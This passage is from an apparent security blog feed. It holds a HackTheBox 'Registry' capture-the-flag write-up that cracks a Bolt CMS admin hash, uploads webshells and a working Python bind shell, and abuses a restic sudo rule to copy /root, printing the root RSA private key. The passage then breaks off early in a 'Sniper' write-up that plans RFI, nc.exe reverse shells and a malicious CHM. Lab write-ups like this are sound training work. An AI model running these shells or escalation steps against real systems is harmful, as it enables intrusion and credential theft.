<span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">14</span> root     root     <span class="number">4.0</span>K May <span class="number">19</span>  <span class="number">2019</span> ..</span><br><span class="line">drwx------  <span class="number">3</span> root     root     <span class="number">4.0</span>K May <span class="number">26</span>  <span class="number">2019</span> .cache</span><br><span class="line">drwxrwxr-x  <span class="number">4</span> www-data www-data <span class="number">4.0</span>K Apr  <span class="number">4</span> <span class="number">22</span>:<span class="number">01</span> html</span><br><span class="line"></span><br><span class="line">/var/www/html:</span><br><span class="line">total <span class="number">32</span>K</span><br><span class="line">drwxrwxr-x  <span class="number">4</span> www-data www-data <span class="number">4.0</span>K Apr  <span class="number">4</span> <span class="number">22</span>:<span class="number">01</span> .</span><br></pre></td></tr></table></figure><p>I visited the bolt website at <code>registry.htb/bolt</code></p><p><img src="/img/registry/registry-bolt-page.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p><p>Then I decrypt the password hasha using <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a> so:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ john bolt-hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using <span class="keyword">default</span> input encoding: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="function">password <span class="title">hash</span> (<span class="params">bcrypt [Blowfish <span class="number">32</span>/<span class="number">64</span> X3]</span>)</span></span><br><span class="line"><span class="function">Cost 1 (<span class="params">iteration count</span>) <span class="keyword">is</span> 1024 <span class="keyword">for</span> all loaded hashes</span></span><br><span class="line"><span class="function">Will run 4 OpenMP threads</span></span><br><span class="line"><span class="function">Press 'q' or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span></span><br><span class="line"><span class="function"><span class="title">strawberry</span>       (<span class="params">admin</span>)</span></span><br><span class="line"><span class="function">1g 0:00:00:05 <span class="title">DONE</span> (<span class="params"><span class="number">2020</span><span class="number">-04</span><span class="number">-05</span> <span class="number">06</span>:<span class="number">54</span></span>) 0.1996g/s 71.85p/s 71.85c/s 71.85C/s strawberry..brianna</span></span><br><span class="line"><span class="function">Use the "--show" option to display all of the cracked passwords reliably</span></span><br><span class="line"><span class="function">Session completed</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 took 9s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure><p>after only 9 seconds i get the password <strong><em>strawberry</em></strong> and login this into Bolt CMS</p><p><strong>BOLT CMS LOGIN PAGE</strong></p><p><img src="/img/registry/registry-bolt-login.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p><p>After login it display the dashboard which has a lot of stuffs.</p><p><strong>BOLT CMS DASHBOARD PAGE</strong></p><p><img src="/img/registry/registry-dashboard.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p><p>I search on the bolt cms exploit and I found this <a href="https://fgsec.net/from-csrf-to-rce-bolt-cms/" target="_blank" rel="noopener">article</a> it is the same version on the bolt cms installed on the registry machine.</p><p>I tried to follow the exploitation but it doesn‚Äôt work. Also this part was really hard because theres a cron job inside that will erase everything you modified to I need to be fast as much.</p><p>So this is the default <code>Config.yml</code> in Bolt CMS Configuration where you can edit <code>accept_file_types</code>.</p><p><img src="/img/registry/registry-config-default.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p><p>In the configuration file i‚Äôll put <code>php</code>, and <code>py</code> extensions so I can upload my webshells. Why I need to upload 2 different file ? <strong><em>PHP Reverse Shell</em></strong> is not working so I search for other webshell that I can execute and get remote inside on the webserver.</p><p><img src="/img/registry/registry-config-edited.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p><p>Until i found out that I can use <code>Bind Shell</code> go gain remote shell. So I created my simple <strong><em>bind shell</em></strong> with python. this is similar to this <a href="https://github.com/Andhrimnirr/Python-Reverse-Bind-Shell" target="_blank" rel="noopener">one</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: nc -v &lt;ipaddress&gt; 9001 in the attacker machine to connect to the shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">9001</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">''</span>, PORT))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">(rem, addr) = s.accept()</span><br><span class="line">os.dup2(rem.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(rem.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(rem.fileno(),<span class="number">2</span>)</span><br><span class="line">os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>save it ! then I used <a href="https://cybarrior.com/blog/2019/05/09/p0wnyshell/" target="_blank" rel="noopener">p0wnyShell</a> so I can run the bind shell (<code>shell.py</code>) and connect it with my Kali Linux so. after done setting up I‚Äô uploaded it into <strong>File Management</strong> inside the Bolt CMS.</p><p><img src="/img/registry/registry-uploaded.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p><p>now I will open the <code>p0wnyshell</code> and run the <code>shell.py</code></p><p><img src="/img/registry/registry-pownyshell.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p><p>You will see that the port is in already in use but it‚Äôs okay I can still connect with my Kali Linux, and Now I‚Äôm on the shell of <code>www-data</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root in htb/boxes/Registry via üêò v7<span class="number">.3</span><span class="number">.15</span> via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ nc -v <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> <span class="number">9001</span></span><br><span class="line">registry.htb [<span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>] <span class="number">9001</span> (?) <span class="built_in">open</span></span><br><span class="line">www-data@bolt:~/html/bolt/files$ ls</span><br><span class="line">ls</span><br><span class="line">www-data@bolt:~/html/bolt/files$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>As a <code>www-data</code> user we can restic <code>sudo</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@bolt:~/html/bolt/files$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bolt:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may <span class="built_in">run</span> the following commands on bolt:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/restic backup -r rest*</span><br><span class="line">www-data@bolt:~/html/bolt/files$</span><br></pre></td></tr></table></figure><p>So as we have privilege for running the restic we can get the root.</p><h3 id="RESTIC-BACKUP-PROGRAM"><a href="#RESTIC-BACKUP-PROGRAM" class="headerlink" title="RESTIC BACKUP PROGRAM"></a>RESTIC BACKUP PROGRAM</h3><p>So what is <strong>Restic</strong> ?<br>Restic is a backup program that is fast, efficient and secure. It supports the three major operating systems (Linux, macOS, Windows) and a few smaller ones (FreeBSD, OpenBSD).</p><p>Since we have privilege by running <code>restic</code> we can backup the <strong><em>root</em></strong> directory and get the administrator shell.</p><p>First I install restic into may Kali Linux.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">sudo apt-get install restic</span><br></pre></td></tr></table></figure><p>after the installation, I will create backup folder and set a password on that.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 4m1s </span><br><span class="line">‚ùØ mkdir backups</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ restic init -r ./backups/</span><br><span class="line">enter password <span class="keyword">for</span> new repository: </span><br><span class="line">enter password again: </span><br><span class="line">created restic repository 6f893c5da1 at ./backups/</span><br><span class="line"></span><br><span class="line">Please note that knowledge of your password is required to access</span><br><span class="line">the repository. Losing your password means that your data is</span><br><span class="line">irrecoverably lost.</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 13s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Looking at the <code>backups</code> directories</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 13s </span><br><span class="line">‚ùØ ls backups/</span><br><span class="line">config  data  index  keys  locks  snapshots</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><h3 id="SETTING-UP-THE-SERVER"><a href="#SETTING-UP-THE-SERVER" class="headerlink" title="SETTING UP THE SERVER"></a>SETTING UP THE SERVER</h3><p>Now I will install <code>docker</code> to my machine and start a server at port 8000</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ sudo apt install docker.io</span><br></pre></td></tr></table></figure><p>Now i will run restic server on my machine and set the path at <code>/backups</code> so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ docker run -p 8000:8000 -v /root/htb/boxes/Registry/backups/:/backups -it restic/rest-server sh</span><br><span class="line">/ <span class="comment"># rest-server --path /backups</span></span><br><span class="line">rest-server 0.9.7 compiled with go1.10 on linux/amd64</span><br><span class="line">Data directory: /backups</span><br><span class="line">Authentication disabled</span><br><span class="line">Private repositories disabled</span><br><span class="line">Starting server on :8000</span><br></pre></td></tr></table></figure><p>after it‚Äôs successfully start the server we will go back the the <strong><em>bolt user shell</em></strong> and set <code>reverse SSH</code> so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sun Apr  5 01:51:21 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 37%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   1%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    164</span><br><span class="line">Last login: Sun Apr  5 01:15:52 2020 from 10.10.15.43</span><br><span class="line">bolt@bolt:~$</span><br></pre></td></tr></table></figure><h3 id="CREATING-BACKUPS"><a href="#CREATING-BACKUPS" class="headerlink" title="CREATING BACKUPS"></a>CREATING BACKUPS</h3><p>Looks good ! Now I can create backups in <code>www-data</code>, I will choose to backup <code>/root/</code> folder because this what I need to ge the administrator so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ nc -v 10.10.10.159 12346</span><br><span class="line">registry.htb [10.10.10.159] 12346 (?) open</span><br><span class="line">www-data@bolt:~/html/bolt/files$ </span><br><span class="line"></span><br><span class="line">www-data@bolt:~/html/bolt/files$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root</span><br><span class="line">&lt;/restic backup -r rest:http://127.0.0.1:8000/ /root</span><br><span class="line">enter password <span class="keyword">for</span> repository: -------------</span><br><span class="line"></span><br><span class="line">password is correct</span><br><span class="line">found 2 old cache directories <span class="keyword">in</span> /var/www/.cache/restic, pass --cleanup-cache to remove them</span><br><span class="line">scan [/root]</span><br><span class="line">scanned 10 directories, 14 files <span class="keyword">in</span> 0:00</span><br><span class="line">[0:01] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 </span><br><span class="line">duration: 0:01</span><br><span class="line">snapshot 4d60990a saved</span><br><span class="line">www-data@bolt:~/html/bolt/files$</span><br></pre></td></tr></table></figure><p>Now it‚Äôs successfully saved on <code>snapshot</code>, back into my machine I will restore the backup I created.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ restic -r backups/ restore latest --target restore/</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 6f893c5d opened successfully, password is correct</span><br><span class="line">created new cache <span class="keyword">in</span> /root/.cache/restic</span><br><span class="line">restoring &lt;Snapshot 4d60990a of [/root] at 2020-04-05 01:58:02.792216091 +0000 UTC by root@bolt&gt; to restore/</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 4s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Success ! Now it will create <code>/restore</code> folder which contains all the files we need, from there I can get the <code>root.txt</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ <span class="built_in">cd</span> restore</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/restore </span><br><span class="line">‚ùØ ls</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/restore </span><br><span class="line">‚ùØ <span class="built_in">cd</span> root</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ ls</span><br><span class="line">config.yml  cron.sh  root.txt</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ cat root.txt</span><br><span class="line">ntrk[---------------------]kztgw</span><br></pre></td></tr></table></figure><p>isn‚Äôt enough we need the administrator shell, i will use the <code>id_rsa</code> inside the <code>.ssh</code> so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ ls -la</span><br><span class="line">total 76</span><br><span class="line">drwx------ 7 root root  4096 Oct 21 18:37 .</span><br><span class="line">drwx------ 3 root root  4096 Apr  5 09:59 ..</span><br><span class="line">lrwxrwxrwx 1 root root     9 May 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 root root  3106 Sep 27  2019 .bashrc</span><br><span class="line">drwx------ 2 root root  4096 Sep 27  2019 .cache</span><br><span class="line">drwxr-xr-x 3 root root  4096 Sep 27  2019 .config</span><br><span class="line">-rw-r--r-- 1 root root 20999 Oct 21 18:04 config.yml</span><br><span class="line">-rw-r--r-- 1 root root   118 Oct 21 18:37 cron.sh</span><br><span class="line">drwx------ 3 root root  4096 Sep 27  2019 .gnupg</span><br><span class="line">drwxr-xr-x 3 root root  4096 Oct  9 04:57 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 root root   148 Aug 17  2015 .profile</span><br><span class="line">-r-------- 1 root root    33 Sep 27  2019 root.txt</span><br><span class="line">-rw-r--r-- 1 root root    66 Oct 21 18:00 .selected_editor</span><br><span class="line">drwxr-xr-x 2 root root  4096 Oct 17 17:58 .ssh</span><br><span class="line">-rw-r--r-- 1 root root   215 Oct 21 16:59 .wget-hsts</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ <span class="built_in">cd</span> .ssh</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ ls</span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ cat id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAmiGiXpswTyHhjgC55jHRWlGX1asEMyDFfkVwhuNohv/4cQKm</span><br><span class="line">cJB/3psQocosq+GMh9Y/uRPUgMcDnrTaNYOdkPS+QLd8vcFKSwSewH1w4/AYLuci</span><br><span class="line">4k71qYsJlkcS2Pb0PqEcpodmXf4OBdTCiCCnjgGhOcvPpKMSCb1vy2Yo+A+eHzKp</span><br><span class="line">1S48LgJRLKU1sGe0KE4MC8g7qpF7NSKOCW69z5KaoopQA3jPxnW17WE9PdGZQvqX</span><br><span class="line">4/Mf9DGdeUrejRlX0BI2EGiZhPKwwKxqIHLRpw4pR4+OjR1sOkAA7UWtMYn/3cs+</span><br><span class="line">IS3L75/i5Qsr0cMCtZ/hQAKtjpPoCCe1qHp7CQIDAQABAoIBAFlvYtQaoLGKK2NG</span><br><span class="line">sJgOGDicV8o37bvtLCvVBzJ+Ck0rgnGw4/s1Hb2BpOj8c2dY/T5k55zxEMGYuVUC</span><br><span class="line">BAxBTtCp8yuCTPOekQluqN9w6myZCK9Ol0NSJeI3N1zn6NvUkG0293T55EBuBp0D</span><br><span class="line">k82BhTg1YeQzi00xAmp8bb5MjUFCiCbSFH1MMpY/9itg1b3mqx7UlyDldMM9UdKH</span><br><span class="line">HS9aZmAzY5/U6wEtJi4mx3QIoVahytMgcxd7qoicCYyVm73HFQsZ58L+5QflygH4</span><br><span class="line">dpbptPOnNmLUkWFXcK3bmlmrEyuafS6z68oDFeAZz8Dg2D2qXWfhdlN4GVstlxSI</span><br><span class="line">skH5sAECgYEAySOp7KOZJVpstF8zjn+/OZowEF4iSHnaGAX64B6GgWwXQURn3wVq</span><br><span class="line">tlqDO5m5vIexe2tyFDSVe5otWtzQvbPNkjpD7/kglGTbT9PCU/Dgb5pTmOxBPi9a</span><br><span class="line">1W8+q7lwiXLIRb4NB+BqDz0yI924BnZt9rukzm9650Rrbala0HZxhIECgYEAxCux</span><br><span class="line">RQUzgSx7YdzThvB8sAzQJj2gNAbwEA9Y56I0pQLvTNoGQY8V8IYBrlvW935kLfcf</span><br><span class="line">xz8j5VNt1BizDQjG8j5FfVcU6VE98/OMgn4XKd6nl9sOoQBXzssjUF+3AIhn5DsK</span><br><span class="line">Q/IymTZEmhfGAt9k6dE4WH8qffea/E7qJY+pkokCgYAdatLiYjb2yJfXdYkD0Vk1</span><br><span class="line">YoCfFDVtZizokI9VkgFYEmgASrHqY09tJiXFZMFOeoYRp/BCVkJ6ll0Fyf/Zjt+F</span><br><span class="line">AHKJOWVzbqDItw7X2gXpLKgHWJ5eKuzdBG0lDnUQFTKHSLl9Kmw4mFmp9zZ/83g3</span><br><span class="line">us/qxVEzW8Vef4Nhs8D8gQKBgDtsMMqDhNKAMu+2AK1Dc8GwX+z1he28nEOBIqEn</span><br><span class="line">1WKWvP4+nN6HBVJShXfXggp+UsJJtWqZiboRx5cT1EkCe6Etk8cf9cmnPmkDQXDV</span><br><span class="line">2RZpx8KMLKZAgFi31/6kv759k1rjN3zVhNY8RhOXV/fOy7a4FaVY//ogYuZC0VKH</span><br><span class="line">bgphAoGBAKGyJQe/b6rUkpzvIBxbGt9Hw1kpLr07VCdPQb1MCdCU4l+mlDD5NBN3</span><br><span class="line">mzygp6MTi+TvN3PhxlfAmUPbz0qw+3aX95pt2cQ492wLOe+RsVsKtvDTgH/2+DUe</span><br><span class="line">2qnb+Jd6ERs3jmBeuuavC2O5ajhyLt1xL3uF5UVpoenCYlYuOvL4</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><h3 id="GET-THE-ADMIN-SHELL"><a href="#GET-THE-ADMIN-SHELL" class="headerlink" title="GET THE ADMIN SHELL"></a>GET THE ADMIN SHELL</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ ssh -i id_rsa root@registry.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sun Apr  5 02:06:19 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 38%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   1%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    169</span><br><span class="line">Last login: Mon Oct 21 09:53:48 2019</span><br><span class="line">root@bolt: whoami</span><br><span class="line">root</span><br><span class="line">root@bolt:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/" target="_blank" rel="noopener">Anatomy of a hack: Docker Registry</a></p><p><a href="https://docs.docker.com/registry/" target="_blank" rel="noopener">Docker Registry</a></p><p><a href="https://blog.dixitaditya.com/exploiting-docker-registry/" target="_blank" rel="noopener">Exploiting Docker Registry</a></p><p><a href="https://cybarrior.com/blog/2019/05/09/p0wnyshell/" target="_blank" rel="noopener">p0wnyshell</a></p><p><a href="https://github.com/Andhrimnirr/Python-Reverse-Bind-Shell" target="_blank" rel="noopener">Bind Shell</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> retired </tag>
            
            <tag> docker </tag>
            
            <tag> registry </tag>
            
            <tag> cms </tag>
            
            <tag> restic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Sniper</title>
      <link href="/2020-03-29/HackTheBox-Sniper/"/>
      <url>/2020-03-29/HackTheBox-Sniper/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/sniper/sniper-info2.png" alt="HackTheBox-Sniper/sniper-info.png" title="Sniper machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí Sniper is another windows machine that you can access in unintended method.<br>   The <code>PHP</code> Web Application was supposed to be vulnerable into <a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/" target="_blank" rel="noopener">LFI or Local File Inclusion</a> to <a href="https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/" target="_blank" rel="noopener">RFI or Remote File Inclusion</a>.<br>   Since this is a windows box I setup a samba share using the <code>RFI</code> method and I injecting my webshell and upload my <code>executable file</code> to get a reverse shell from my Kali Linux machine.<br>   Doing some <code>Reconnaisance</code> I see a file which has to be related to <code>user</code> credentials that need to convert into a plain text then execute it with the <code>executable file</code> i uploaded.<br>   The machine creator was leave a <code>notes.txt</code> on use file directory which is good enough as <code>hint</code>. Creating a malicious payload from my host using <code>Powershell</code> was not easy as my Windows always reject it and cannot load the script file but then I managed to create a malicious <code>CHM</code> file and get the Administrator.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí Enumerate the SMB at port 445</p><p>‚Üí Bruteforce the Web page directories</p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Enumerate the page with <code>Local File Inclusion</code></p><p>‚Üí Setup <code>SAMBA SHARE</code> and upload a webshell</p><p>‚Üí Using the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noopener">access checked</a> provided by the <code>Microsoft</code> to check the access rights of account <code>&quot;Chris&quot;</code></p><p>‚Üí Retrieve <code>user credentials</code> from Web page directories in <code>inetpub</code></p></li><li><p><strong>Exploitation</strong></p><p>‚Üí <strong><em>Method #1:</em></strong><br>Look at listening port that can use to <code>Port Forwarding</code> and Login as <code>Chris</code> using <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">Evil-WinRM</a></p><p>‚Üí <strong><em>Method #2:</em></strong><br>Convert the password hash into plaintext with <code>Powershell</code> and execute the <code>nc.exe</code> to get Reverse shell</p><p>‚Üí Finally got the <code>user.txt</code></p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí Enumerate file directories</p><p>‚Üí Looking at <code>notes.txt</code> that give us hint.</p><p>‚Üí Create a malicious file in <code>Powershell</code> with <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">Out-CHM.ps1</a> from <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a></p><p>‚Üí Transfer to the Sniper machine in <code>C:\Docs</code> directories where the Administrator checked and open it.</p><p>‚Üí Setup <code>netcat</code> listener and</p><p>‚Üí Gain the Administrator shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí First, I run the <strong><em>NMAP</em></strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-T 0-5   ‚áí Set timing template - higher is faster (less accurate)</li><li>-p-      ‚áí Scan all 65535 ports</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line">nmap -sV -sC -T4 -p- 10.10.10.151 -oN nmap-Sniper</span><br></pre></td></tr></table></figure><hr><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper </span><br><span class="line">‚ùØ nmap -sV -sC -T4 -p- 10.10.10.151 -oN nmap-Sniper</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 23:52 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.151</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 65530 filtered ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: 